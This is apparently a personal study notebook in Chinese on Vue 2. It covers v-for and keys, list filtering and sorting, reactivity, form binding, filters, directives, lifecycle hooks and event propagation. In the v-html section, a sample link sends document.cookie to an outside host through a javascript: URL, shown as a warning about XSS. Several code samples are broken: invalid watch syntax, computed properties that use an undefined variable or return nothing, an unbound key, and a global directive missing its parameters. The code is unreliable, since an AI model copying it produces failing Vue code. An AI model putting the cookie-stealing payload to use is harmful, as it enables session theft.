<templete>
    <div id="root">
        <!-- 遍历数组 -->
        <h2>人员列表（遍历数组）</h2>
        <ul>
            <li v-for="(p,index) in persons" :key="index">
                {{p.name}}-{{p.age}}
            </li>
        </ul>

        <!-- 遍历对象 -->
        <h2>汽车信息（遍历对象）</h2>
        <ul>
            <!--此处的k的值是:name、price、color等-->
            <li v-for="(value,k) in car" :key="k">
                {{k}}-{{value}}
            </li>
        </ul>

        <!-- 遍历字符串 -->
        <h2>测试遍历字符串（用得少）</h2>
        <ul>
            <li v-for="(char,index) in str" :key="index">
                {{char}}-{{index}}
            </li>
        </ul>

        <!-- 遍历指定次数 -->
        <h2>测试遍历指定次数（用得少）</h2>
        <ul>
            <li v-for="(number,index) in 5" :key="index">
                {{index}}-{{number}}
            </li>
        </ul>
    </div>
</templete>
<script>
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001',name:'张三',age:18},
                {id:'002',name:'李四',age:19},
                {id:'003',name:'王五',age:20}
            ],
            car:{
                name:'奥迪A8',
                price:'70万',
                color:'黑色'
            },
            str:'hello'
        }
    })
</script>
```



##### 3、遍历过程中key的作用

###### 1、当index作为key时

**![image-20220113145917025](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131459205.png)**



###### 2、当id作为key时

**![image-20220113150107993](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131501189.png)**



###### 3、key的原理

（Diff算法、key的选择会不会带来什么问题？）

```bash
react、vue中key有什么作用？

1、虚拟DOM中key的作用：
	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，
	随后Vue将【新虚拟DOM】与【旧虚拟DOM】进行差异比较（Diff算法），具体的比较规则如下：
	
2、对比规则：
	(1).旧虚拟DOM找到与新的虚拟DOM相同的key：
		①.如果虚拟DOM中的内容没有变化，则直接使用之前的真实DOM
		②.如果虚拟DOM中的内容发生了变化，则生成新的真实DOM，随后替换掉页面中之前的真实DOM
	(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
		创建新的真实DOM，随后渲染到页面上
		
3、用index作为key可能会引发的问题：
	(1).若对数据进行【逆序添加、逆序删除】等破坏顺序的操作
		则会产生没有必要的真实DOM更新 ==> 界面效果没问题，但是效率降低（因为原本可以复用的内容，此时也无法复用了）
	(2).如果结构中还包括输入类的DOM：
		会产生错误的DOM更新 ==> 导致页面出现问题
		
4、开发中如何选择key
	(1).最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号等
	(2).如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅仅用于渲染列表等展示性操作，那么使用index作为key也是没有问题的
```



##### 4、列表过滤

**案例：**

###### 1、实现方式1（watch）实现

```vue
<templete>
	<div id="App">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p, index) in filerPersons" :key="index">
            	{{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
</templete>
<script>
   export default {
		name: 'App',
		data: {
            keyWord: '',
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ],
            filerPersons:[] // 用来存储过滤之后的列表，防止对原本的persons的值产生影响
        },
        watch:{
            keyWord() {
                immediate: true, // 开始时就执行一次，这样因为所有的数据都有空字符串的子串，所以初始时会显示所有数据
                handler(val){
                    this.filerPersons = this.persons.filter((p) => {
                    	return p.name.indexOf(val) !== -1;
                	})
                }  
            }
        }
	}
</script>
```



###### 2、实现方式2（计算属性computed）

```vue
<templete>
	<div id="App">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <ul>
            <li v-for="(p, index) in filerPersons" :key="index">
            	{{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
</templete>
<script>
   export default {
		name: 'App',
		data: {
            keyWord: '',
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ]
        },
        computed: {
            // 计算属性（不需要子啊data中进行定义）
            filerPersons() {
                return this.filerPersons = this.persons.filter((p) => {
                    return p.name.indexOf(val) !== -1;
                })
            }
        }
	}
</script>
```



##### 5、列表排序

仍然使用上面已经提供好的案例，进行过滤后数据的升序、降序等操作

```vue
<templete>
	<div id="App">
        <h2>人员列表</h2>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <button @click="sortType = 2">年龄升序</button>
        <button @click="sortType = 1">年龄降序</button>
        <button @click="sortType = 0">年龄原序</button>
        <ul>
            <!--此处的key最好和id进行绑定，因为频繁的打乱数据顺序，使用index会导致效率低下-->
            <li v-for="(p, index) in filerPersons" :key="id">
            	{{p.name}}-{{p.age}}-{{p.sex}}
            </li>
        </ul>
    </div>
</templete>
<script>
   export default {
		name: 'App',
		data: {
            keyWord: '',
            sortType: 0,  // 默认为原顺序
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ]
        },
        computed: {
            // 计算属性（不需要子啊data中进行定义）
            filerPersons() {
                const arr = this.filerPersons = this.persons.filter((p) => {
                    return p.name.indexOf(val) !== -1;
                });
                // 判断是否需要进行排序的逻辑
                if(this.sortType) {
                    // 这里使用sort方法， arr.sort(a, b)， 如果返回结果为(a - b)，那么为升序； 如果结果为(b - a)，那么为降序【后 - 前】(降序); 【前 - 后】(升序)
                    arr.sort((p1, p2) => {
                        // 此处我们的设定就是，当sortType的值为1的时候，就是降序的；当sortType的值为2的时候，就是升序的
                        return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age;
                    })
                }
            }
        }
	}
</script>
```



#### 12、数据监测

##### 1、Vue监测数据==原理== [对象中的数据]

###### 1、流程图

**![image-20220113170904598](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131709717.png)**



###### 2、模拟一个数据监测功能

（监测一个对象中的数据）

```html
<script type="text/javascript">
	let data = {
        name: '朱梦仁',
        age: 22
    }
    
    /* 1、其实就相当于加工Data的那一步 */
    // 创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data);
    console.log(obs)
    
    /* 2、其实就相当于第二步，将vm._data的值赋给data */
    // 准备一个vm实例对象
    let vm = {};
    vm._data = data = obs;
    
    // 定义监视对象的方法
    function Observer(obj) {
        // 汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj);
        // 遍历
        keys.forEach((k) => {
            Object.defineProperty(this, k, {
                get() {
                    return obj[k];
                },
                set(val) {
                    console.log(`${k}的值被修改了，接下来需要去解析模板，生成虚拟DOM去了...`);
                    obj[k] = val;
                }
            })
        })
    }
</script>
```



###### 3、Vue.set()方法

1、[官网链接](https://cn.vuejs.org/v2/api/#Vue-set)

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131727437.png" alt="image-20220113172704330" style="zoom:80%;" />**

使用这个方法，可以给新增的属性添加上`getter`和`setter`方法，从而使得新增的属性具有响应式的效果



##### 2、Vue监测[数组中的数据]

1、[官网链接](https://cn.vuejs.org/v2/guide/list.html#%E6%95%B0%E7%BB%84%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B)

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131741400.png" alt="image-20220113174112317" style="zoom:80%;" />**

Vue实际上将原本对于数组操作的相关方法进行了封装（1、原本数组的操作； 2、重新解析模板，生成虚拟DOM...）



##### 3、数据监测总结

###### 1、文字性总结

```bash
Vue监视数据的原理：
1. vue会监视data中所有层次的数据。

2. 如何监测对象中的数据？
	通过setter实现监视，且要在new Vue时就传入要监测的数据。
	(1).对象中后追加的属性，Vue默认不做响应式处理
	(2).如需给后添加的属性做响应式，请使用如下API：
		Vue.set(target，propertyName/index，value) 或 
		vm.$set(target，propertyName/index，value)

3. 如何监测数组中的数据？
	通过包裹数组更新元素的方法实现，本质就是做了两件事：
	(1).调用原生对应的方法对数组进行更新。
	(2).重新解析模板，进而更新页面。

4.在Vue修改数组中的某个元素一定要用如下方法：
	(1).使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
	(2).Vue.set() 或 vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
```



###### 2、代码示例

```vue
<templete>
	<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
</templete>
<script>
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
                  // 给对象中的数据添加一个新的属性(且新增的属性有getter和setter方法)
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
                  // 给数组添加一条新的数据(在最前端)【且添加的数据是一个对象类型的数据】
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
                  // 修改数组中的某条记录(这条记录是一个对象)，它的内部的某个属性的值(这个属性其实已经被vue给予了getter和setter方法)
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
                  // 给数组中添加一个数据(这个数组是一个普通的数组)
				addHobby(){
					this.student.hobby.push('学习')
				},
                  // 修改数组中的某一个记录的值
				updateHobby(){
					this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					// this.$set(this.student.hobby,0,'开车')
				},
                  // 使用filter的话，实际上会生成一个新的数组，所以这里要将新生成的数组直接赋给原本的数组就可以了
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
</script>
```





#### 13、收集表单数据

##### 1、总结

```bash
收集表单数据的时候：
# 普通的文本输入框(使用v-model默认收集输入的文本内容)，这里是不需要专门配置value的
1、如果为<input type="text"/>或者<input type="password"/>或者<input type="number"/>，则v-model收集的是value值，用户输入的就是value值 

# 单选框，默认收集的是value值，如果不进行配置的话，则收集到的值为null，所以要想它生效，需要配置具体的value值
2、如果为<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值 

# 多选框，1、需要给每一个input配置value值; 2、需要将它们v-model所绑定的那个值声明成一个数组格式
3、如果为<input type="checkbox"/>
   (1).没有配置input的value属性，那么收集的就是checked的值(勾选状态为true，未勾选状态为false【boolean值】)
   (2).配置input的value属性
   	   [1].v-model的初始值不是数组，那么收集的就是checked的值(true或者false)
   	   [2].v-model的初始值是数组，那么收集的值就是value组成的数组
 
# v-model的补充使用 
4、other
   (1). v-model.lazy:失去焦点的时候再收集数据(针对需要大量输入数据的input框比较好)
   (2). v-model.number:输入的字符串转换为有效的数字，配合<input type="number">使用
   (3). v-model.trim: 将输入的文本或者数据的首尾的空格过滤掉
```



##### 2、示例

```vue
<templete>
	<div id="root">
             <!--设置提交时阻止默认行为(跳转页面)-->
			<form @submit.prevent="demo">
                  <!--文本输入框-->
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
                  <!--这里使用v-model.number和type="number"配合使用，可以使得输入的数据最终在两边都是数字类型-->
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
                
                 <!--单选框-->
				性别：
                 <!--这里要声明对应的value值(为了让vue收集到具体勾选的内容)，且v-model绑定的值是同一个(表明它们是一组数据【互斥】)-->
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
                
                  <!--多选框-->
				爱好：
                  <!--此处必须声明value值，因为checkbox默认收集的是checked的值(true或者false)，声明为value，且在data中它们绑定的hobby声明为一个数组形式，就可以正常的获取数据-->
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
                
                  <!--下拉选择框-->
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
                
                  <!--大量文本输入框-->
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
                
                  <!--协议输入框-->
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.baidu.com">《用户协议》</a>
				<button>提交</button>
			</form>
		</div>
</templete>
<script>
	new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18, // 初始值要声明为number值
					sex:'female', // 声明初始值
					hobby:[], // 多选框的数据部分要声明成数组形式
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
		})
</script>
```





#### 14、过滤器

##### 1、总结

```bash
1、定义：对要显示的数据进行特定格式化后再显示(适用一些简单逻辑的处理)

2、语法：
	(1).注册过滤器: 【全局注册】Vue.filter(name, callback(回调函数)) 、 【局部】 new Vue(){ filters:{} } 
	(2).使用过滤器: 【插值语法内使用】{{xxx | 过滤器名}}、【v-bind属性内使用】v-bind:属性 = "xxx | 过滤器名"
	
3、备注：
	(1).过滤器可以接收额外参数，多个过滤器可以进行串联
	(2).并没有改变原本的数据，只是产生了新的对应的数据
```



##### 2、示例

1、[dayjs库的来源](https://www.bootcdn.cn/dayjs/)

2、[bootCDN链接](https://www.bootcdn.cn/)



```vue
<!--此处的dayjs()方法是引用的外部的第三方库(一个用来将时间戳格式化的库)-->
<templete>
	<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
	</div>
</templete>
<script>
	    //全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		
		new Vue({
			el:'#root',
			data:{
				time:1621561377603, //时间戳
				msg:'你好，朱梦仁'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
                 // 此处可以传入两个值，第一个参数的值为value(过滤符前方给定的那个值)，str(此处是给定的时间format格式规则)
                 // str="XXX",(如果str没有给定值，则使用这里的XXX的值，反之使用给定的值)
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					// console.log('@',value)
					return dayjs(value).format(str)
				}
			}
		})
</script>
```





#### 15、Vue内置指令

##### 1、已经学习过的指令

```bash
v-bind	: 单向绑定解析表达式, 可简写为 :xxx
v-model	: 双向数据绑定
v-for  	: 遍历数组/对象/字符串
v-on   	: 绑定事件监听, 可简写为@
v-if    : 条件渲染（动态控制节点是否存存在）
v-else 	: 条件渲染（动态控制节点是否存存在）
v-show 	: 条件渲染 (动态控制节点是否展示)
```



##### 2、v-text

###### 1、总结

```bash
1.作用：向其所在的节点中渲染文本内容。
2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
```



###### 2、使用

```vue
<templete>
    <div id="root">
        <!--插值语法实现, 更加灵活-->
        <div>你好，{{name}}</div>
        <!--v-text实现, 将div中原本的文本内容全部替换为v-text的内容-->
        <div v-text="name">原本的内容</div>
        <!--v-text是替换文本的，所以此处str实际上是定义的标签，但是不会生效-->
        <div v-text="str"></div>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				name:'朱梦仁',
				str:'<h3>你好啊！</h3>'
			}
		})
</script>
```



##### 3、v-html ==存在安全性问题==

参看**知识补充**部分的cookie知识补充



###### 1、样例（正常）

```vue
<templete>
    <div id="root">
       <div v-html="str"></div>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				str:'<h3>你好啊！</h3>'
			}
		})
</script>
```

这样使用可以将h3标签中的内容正常解析到div标签中，从而显示出内容



###### 2、样例（存在安全问题）

```vue
<templete>
    <div id="root">
       <div v-html="str2"></div>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+ document.cookie>危险链接</a>'
			}
		})
</script>
```

因为这里使用了`document.cookie`，所以如果服务器给我们的浏览器返回的`cookie`的值没有经过`http`特殊处理的话，就会被这里的a标签给获取并返回到，这就相当于我们在浏览器上登陆的网站的账号泄露了一样==【具体安全问题参看Cookie知识补充部分】==



##### 4、v-cloak

###### 1、总结

```bash
# Vue初始化完成的时候，这个特殊属性(v-cloak)就会被删除掉
1、本质上是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性

2、使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题
```



###### 2、示例

```vue
<templete>
    <div id="root">
        <!--Vue实例创建完毕并接管容器后，会删掉v-cloak属性-->
        <h2 v-cloak>{{name}}</h2>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				name: "朱梦仁"
			}
		})
</script>
<css>
    <!-- 属性选择器,选择v-cloak属性,包含它的元素是不显示的 -->
    [v-cloak]{
    	display:none;
    }
</css>
```





##### 5、v-once

###### 1、总结

```bash
1、v-once所在的节点在初次动态渲染后，就视为静态内容了

2、以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
```



###### 2、示例

```vue
<templete>
    <div id="root">
        <!--此处使用v-once命令，只会在初始化的时候将n的值读取出来(变为静态内容)，后续不会再进行动态渲染了-->
        <h2 v-once>初始时n的值为：{{n}}</h2>
        <h2>变化后n的值为：{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				n: 1
			}
		})
</script>
```



##### 6、v-pre

###### 1、总结

```bash
1、跳过其所在节点的编译过程。

2、可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
```



###### 2、示例

```vue
<templete>
    <div id="root">
        <!--此处使用v-pre命令，Vue会直接跳过含有v-pre的那些行的编译过程，直接就显示，可以优化部分内容-->
        <h2 v-pre>Vue其实很简单</h2>
        <h2 >当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				n: 1
			}
		})
</script>
```





##### 7、自定义指令 `directives`

###### 1、总结

```bash
1、定义语法：
    (1).局部指令：
        new Vue({	
            directives:{指令名:配置对象}   或   directives{指令名:回调函数}
        }) 
        
    (2).全局指令：
    Vue.directive(指令名,配置对象) 或  Vue.directive(指令名,回调函数)

2、配置对象中常用的3个回调：
    (1).bind：指令与元素成功绑定时调用。
    (2).inserted：指令所在元素被插入页面时调用。
    (3).update：指令所在模板结构被重新解析时调用。

3、备注：
    (1).指令定义时不加v-，但使用时要加v-；
    (2).指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
```



###### 2、基本示例

```vue
<templete>
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span> </h2>
        <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
        <button @click="n++">点我n+1</button>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				n: 1
			},
             directives:{
                    //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
                    big(element,binding){
                        console.log('big',this) //注意此处的this是window
                        console.log('element', element);
					  console.log('binding', binding);
                        // console.log('big')
                        element.innerText = binding.value * 10
                    }
             }
		})
</script>
```

运行之后的结果如下图所示：

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201141433861.png" alt="image-20220114143348771" style="zoom:80%;" />**

可以看到我们定义的n的值实际上在这里就是`binding`的`value`的值



###### 3、完全示例

```vue
<templete>
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span> </h2>
        <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
        <button @click="n++">点我n+1</button>
        <!--此次测试修改的地方(加上了v-fbind自定义指令)-->
        <input type="text" v-fbind:value="n">
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				n: 1
			},
             directives:{
                    //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
                    big(element,binding){
                        element.innerText = binding.value * 10
                    },
                  	/*
                 	fbind(element,binding){
                        element.value = binding.value;
                        element.focus(); // 获取焦点
                    }*/
                 	fbind:{
                        // 指令与元素成功绑定时(这个时候其实就是页面解析模板的时候，解析完成之后并没有将DOM元素放置到页面上，只是将input框和我们自定义的v-fbind命令绑定到一块儿)
                        bind(element,binding){
                            element.value = binding.value;
                        },
                        // 指令所在元素被插入页面时(这个时机其实就是DOM元素初次被页面解析出来的时候，显示到页面上)
                        inserted(element,binding){
                            // 在这个时机去给元素获取焦点是合适的，因为这个时候页面上的DOM元素已经被声明出来了，那么依赖于这个元素做一些操作，比如获取焦点啊、给它的父级元素添加一些样式啊等等都是可以的
                            element.focus(); 
                        },
                        // 指令所在的模板被重新解析时(这个时机其实就是当页面中的data元素或者其他元素被修改了，导致vue重新解析了页面的时候)
                        update(element,binding){
                            element.value = binding.value;
                        }
                    }
             }
		})
</script>
```

可以发现，其实在自定义指令内部的`bind`和`update`两个方法的内部定义的内容一般都是一样的，所以Vue给我们提供了自定义指令的简写形式



###### 4、坑

**1、自定义指令名称由多个单词组成**

就需要使用下方的定义方法

```vue
<templete>
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span> </h2>
        <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2>
        <button @click="n++">点我n+1</button>
    </div>
</templete>
<script>
    new Vue({
			el:'#root',
			data:{
				n: 1
			},
             directives:{
                    //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
                    'big-number'(element,binding){
                        console.log('big',this) //注意此处的this是window
                        console.log('element', element);
					  console.log('binding', binding);
                        // console.log('big')
                        element.innerText = binding.value * 10
                    }
             }
		})
</script>
```



**2、自定义指令的this**

仍然是上方的写法，这里的`this`实际上是`window`，所以**要操作数据的话，就需要在指令绑定的那里就将数据传递进去**





###### 5、全局指令的写法

```vue
<script>
    // 定义全局指令(简写体)
    Vue.directive('big', function() {
        element.innerText = binding.value * 10
    });
    
    // 定义全局指令(完全体)
    Vue.directive('fbind',{
        //指令与元素成功绑定时（一上来）
        bind(element,binding){
            element.value = binding.value
        },
        //指令所在元素被插入页面时
        inserted(element,binding){
            element.focus()
        },
        //指令所在的模板被重新解析时
        update(element,binding){
            element.value = binding.value
        }
    });
    
    new Vue({
			el:'#root',
			data:{
				n: 1
			}
		})
</script>
```





#### 16、生命周期 ==main==

##### 1、什么是生命周期？

```bash
1、又名：生命周期回调函数、生命周期函数、生命周期钩子。

2、是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。

3、生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。

4、生命周期函数中的this指向是vm 或 组件实例对象。
```



##### 2、生命周期图示

**参考链接：** [官网链接](https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA)

**![image-20220114154031693](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201141540921.png)**





##### 3、总结

```bash
1、常用的生命周期钩子：
    (1).mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
    (2).beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

2、关于销毁Vue实例
    (1).销毁后借助Vue开发者工具看不到任何信息。
    (2).销毁后自定义事件会失效，但原生DOM事件依然有效。
    (3).一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
    
3、这些钩子在使用的时候，是和data同级的，且都是方法，具体使用参看下方
```

**示例：**

```vue
<script>
	new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将销毁')
			},
		})
</script>
```





### 2、组件化编程

#### 1、图示对比

**传统的前端编辑**

**![image-20220114163712190](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201141637398.png)**





















### Add、知识补充

#### 0、其他参考链接

1、[Vue.js 监听属性](https://www.runoob.com/vue2/vue-watch.html) --> [千米与米的转换](https://www.runoob.com/try/try-cdnjs.php?filename=vue2-watch)

2、[JavaScript实现为事件句柄绑定监听函数的方法分析](https://www.jb51.net/article/128201.htm)

3、[javascript事件与功能说明大全](http://tools.jb51.net/table/javascript_event)

4、[正确认识Javascript事件机制](https://yuerblog.cc/2017/05/02/understand-javascript-event/)

5、[JavaScript 自定义事件如此简单！](https://zhuanlan.zhihu.com/p/108447200)





#### 1、事件捕获&事件冒泡

##### 1、快速了解

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201121447583.png" alt="image-20220112144714534" style="zoom:80%;" />**

如图所示，蓝色箭头为**事件捕获阶段**（**特点：** 由外而内，但是并不处理任何事件）

红色箭头为**事件冒泡阶段**（**特点：** 由内而外，从内层开始逐步处理事件）



##### 2、相关问题&具体解答

```bash
0、问：什么是事件？
答：事件：当事件发生的时候，JS通过一个对象表示这个事件。

1、问：什么是事件冒泡？事件捕获？
答：事件冒泡：事件发生于产生交互的元素上，并沿着父路径向上冒泡，这样父级元素都可以监听到这个事件。
事件捕获：与冒泡的路径相反，也可以理解为事件的下沉，事件从body向交互元素移动，这样路径上的元素都可以捕获到这个事件。

2、问：事件的流程是什么？
答：1、当与某个元素发生交互后，属于这个元素的事件对象被创建出来。
    2、接下来进入了事件捕获阶段，也就是将这个事件对象从body层开始向交互元素逐级下沉，路径上的元素如果之前注册过事件监听函数（注册事件监听的时候指定了捕获阶段回调）就会被回调。
    3、事件抵达交互元素后发生”反弹”，也就是开始从交互元素向body冒泡，路径上的元素如果之前注册过事件监听函数（注册事件监听的时候指定了冒泡阶段回调）就会被回调。
    4、无论是捕获还是冒泡阶段，我们都可以禁止事件的默认处理
    注意：
    * 默认处理只会在产生事件的那个交互元素上执行，与它冒泡或者捕获阶段经过路径上的其他元素无关。
    * 无论你在路径上的哪个元素的事件回调中禁止了事件的默认处理，最终阻止的都是交互元素的默认处理，而不是经过的那个元素。
```



#### 2、衍生思考-Node.js事件处理流程

**参考链接：**

1、[Node.js 浅析事件驱动机制](https://bbs.huaweicloud.com/blogs/detail/197342)

2、[Node.js 基础概念 之 回调函数](https://bbs.huaweicloud.com/blogs/197336)



```text
1、Node.js事件处理流程？
```

参考链接： [Node.js 浅析事件驱动机制](https://bbs.huaweicloud.com/blogs/detail/197342)

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131113359.png" alt="node_js处理流程" style="zoom: 67%;" />**

```txt
	前端发起请求，web服务器接收请求，然后将这个条请求放到事件队列里，此时不做任何读写操作，接着执行下面的代码，而放置到事件队列里的事件，回按先进先出的顺序，去处理事件，处理完的结果，放到处理完了的事件队列里，上图中为回调结果队列，然后当程序监听到这个事件被处理完了的时候就会触发回调函数，然后再返回给Node.js的运行结果中。
```



#### 3、衍生思考-[什么是回调函数？](https://bbs.huaweicloud.com/blogs/197336)

回调函数存在于异步处理函数中

==阻塞代码（同步）==示例：

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131113873.png" alt="image-20211019115117572" style="zoom:80%;" />**

程序必须在同步执行情况下，程序的执行必须要在文件读取完成之后才开始进行



==非阻塞代码（异步）==示例：

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131113190.png" alt="image-20211019115404193" style="zoom:80%;" />**

程序的执行和文件的读取是同时进行的，互相不进行干扰，故而运行结果中程序执行可以在读完文件之前执行完成

当文件读取完成后，通过回调函数返回给我们需要的数据。



​	所以阻塞（同步）是按代码顺序执行的，而非阻塞（异步）是不需要按照代码顺序来执行的，如果我们需要单独处理回调函数的参数，那么把相关的代码写到回调函数里即可。



#### 4、Cookie知识补充

